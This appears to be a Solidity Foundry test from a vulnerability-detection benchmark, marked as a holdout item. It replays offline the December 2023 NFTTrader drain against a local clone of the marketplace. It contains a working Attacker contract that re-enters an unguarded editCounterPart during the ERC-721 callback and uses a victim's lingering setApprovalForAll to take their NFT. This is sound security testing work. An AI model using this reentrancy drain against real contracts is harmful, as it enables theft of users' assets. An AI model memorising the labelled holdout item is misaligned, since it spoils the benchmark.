// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {MiniERC721, NftTraderClone, IERC721Receiver} from
    "../fixtures/set-approval-for-all/b-incident/NftTraderClone.sol";

/// @title set-approval-for-all (b) real-incident HOLDOUT: NFTTrader.org operator-approval drain.
/// @notice Minimized OFFLINE replay (no live RPC) of the 2023-12-16 NFTTrader drain (~$3M). A victim
///         held a lingering `setApprovalForAll(marketplace, true)` over an NFT collection. The
///         attacker opened a swap and, inside the ERC-721 callback fired during settlement, re-entered
///         the unguarded `editCounterPart` to name the victim as counterparty; the marketplace then
///         pulled the victim's NFT with the victim's standing operator approval. The verdict is derived
///         from the real outcome (the victim's NFT ends up at the attacker), not hardcoded.
///         HOLDOUT (label=vuln). Incident facts/sources: see fixture PROVENANCE.md.
contract NftTraderIncidentTest is Test {
    function _report(string memory target, bool drained) internal pure {
        console.log(
            string.concat(
                "[set-approval-for-all] target=", target, " verdict=", drained ? "VULNERABLE" : "BLOCKED"
            )
        );
    }

    function test_nftTraderOperatorApprovalDrain_isDrained() public {
        MiniERC721 collection = new MiniERC721(); // the valuable collection (e.g. CloneX)
        MiniERC721 bait = new MiniERC721(); // the attacker's throwaway offered NFT
        NftTraderClone market = new NftTraderClone();

        Attacker attacker = new Attacker(market, collection, bait);

        // Victim owns a prized NFT and, like the real victims, left a blanket operator approval to
        // the marketplace standing from an earlier legitimate interaction.
        address victim = makeAddr("victim");
        uint256 victimTokenId = 6670; // CloneX #6670 was one of the real drained tokens
        collection.mint(victim, victimTokenId);
        vm.prank(victim);
        collection.setApprovalForAll(address(market), true);

        // The attacker's bait NFT (offered side of the swap).
        uint256 baitId = 1;
        bait.mint(address(attacker), baitId);

        assertEq(collection.ownerOf(victimTokenId), victim, "precondition: victim owns the NFT");

        attacker.run(victimTokenId, baitId, victim);

        bool drained = collection.ownerOf(victimTokenId) == address(attacker);
        _report("nfttrader-operator-victim", drained);

        assertTrue(drained, "lingering setApprovalForAll + unguarded editCounterPart should drain the NFT");
    }
}

/// @dev Attacker marketplace client: opens the swap, then during the settlement callback redirects
///      the counterparty to the victim (the documented reentrancy flaw).
contract Attacker is IERC721Receiver {
    NftTraderClone immutable market;
    MiniERC721 immutable collection;
    MiniERC721 immutable bait;
    uint256 swapId;
    address victim;

    constructor(NftTraderClone _market, MiniERC721 _collection, MiniERC721 _bait) {
        market = _market;
        collection = _collection;
        bait = _bait;
    }

    function run(uint256 victimTokenId, uint256 baitId, address _victim) external {
        victim = _victim;
        bait.setApprovalForAll(address(market), true); // let the marketplace escrow the bait
        swapId = market.createSwapIntent(bait, baitId, collection, victimTokenId);
        market.closeSwapIntent(swapId);
    }

    // Fires when the marketplace hands the escrowed bait back during settlement - re-enter here.
    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        // No reentrancy guard on editCounterPart: point the swap at the victim mid-settlement.
        if (victim != address(0)) {
            market.editCounterPart(swapId, victim);
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}
